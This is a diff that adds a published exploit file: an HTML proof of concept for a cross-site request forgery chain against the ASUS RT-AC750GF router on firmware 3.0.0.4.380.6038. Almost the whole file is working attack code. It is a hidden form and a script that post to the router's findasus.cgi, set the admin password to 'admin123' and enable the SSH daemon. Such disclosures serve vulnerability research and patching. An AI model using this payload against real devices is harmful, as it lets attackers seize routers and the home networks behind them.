@@ -1,0 +1,28 @@
+# Exploit Title: AsusWRT RT-AC750GF - Cross-Site Request Forgery (Change Admin Password)
+# Date: 2018-06-23
+# Exploit Author: Wadeek
+# Vendor Homepage: https://www.asus.com/
+# Firmware Link: http://dlcdnet.asus.com/pub/ASUS/wireless/RT-AC750GF/FW_RT_AC750GF_30043806038.zip
+# Firmware Version: 3.0.0.4.380.6038
+# Tested on: ASUS RT-AC750GF with default firmware version 3.0.0.4.380.6038
+
+# (Cross Site Scripting -> URL Redirecting -> Cross-Site Request Forgery {Cookie: asus_token}
+# -> Change the router login password and enable SSH daemon)
+
+<html>
+<body>
+<p>Proof Of Concept</p>
+<!-- <form action="http://192.168.1.1/findasus.cgi" method="POST"> -->
+<form action="http://router.asus.com/findasus.cgi" method="POST">
+<input type="hidden" name="action_mode" value="refresh_networkmap" />
+<input type="text" id="current_page" name="current_page" value="" />
+<script>
+// set username at admin
+// set password at admin123
+// enable ssh daemon
+document.getElementById("current_page").value = "start_apply.htm?productid=RT-AC53&current_page=Advanced_System_Content.asp&next_page=Advanced_System_Content.asp&modified=0&action_mode=apply&action_wait=5&action_script=restart_time%3Brestart_upnp&http_username=admin&http_passwd=admin123&http_passwd2=admin123&v_password2=admin123&sshd_enable=1&sshd_port=22&sshd_pass=1&sshd_authkeys=";
+</script>
+<input type="submit" value="" />
+</form>
+</body>
+</html>
